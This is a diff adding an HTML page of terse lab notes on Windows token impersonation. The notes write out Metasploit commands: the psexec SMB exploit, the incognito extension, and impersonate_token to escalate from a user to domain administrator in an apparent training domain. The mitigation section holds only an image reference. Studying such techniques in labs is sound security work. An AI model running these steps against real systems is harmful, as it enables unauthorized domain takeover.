@@ -1,0 +1,66 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Toekn-Impersonation</title>
+</head><body><img src="image.png" /><br/>
+<br/>
+temporary keys:access to a network without credentials, like cookies<br/>
+<br/>
+#msfconsole<br/>
+#use exploit/windows/smb/psexec<br/>
+<img src="image 2.png" /><br/>
+<br/>
+#show targets<br/>
+#set target 2<br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+<img src="image 4.png" /><br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+#load (press tab twice for options) incognito<br/>
+<br/>
+<img src="image 6.png" /><br/>
+<br/>
+<br/>
+<img src="image 7.png" /><br/>
+<br/>
+<img src="image 8.png" /><br/>
+<br/>
+when you are logged in as fcastle <br/>
+<br/>
+<br/>
+<img src="image 9.png" /><br/>
+<br/>
+right now its showing MARVEL\fcastle<br/>
+#impersonate_token marvel\\fcastle <br/>
+<br/>
+but when you login as ADMIN on fcastle<br/>
+<br/>
+#impersonate_token marvel\\administrator(2 backslash)<br/>
+<br/>
+<br/>
+<img src="image 10.png" /><br/>
+you get marvel\administrator<br/>
+<br/>
+OR<br/>
+<br/>
+<img src="image 11.png" /><br/>
+<br/>
+#shell<br/>
+#whoami<br/>
+<br/>
+<img src="image 12.png" /><br/>
+<br/>
+<img src="image 13.png" /><br/>
+<br/>
+token stays in a computer until rebooted<br/>
+<br/>
+Mitigation-------<br/>
+<br/>
+<img src="image 14.png" /><br/>
+<br/>
+<br/>
+</body></html>
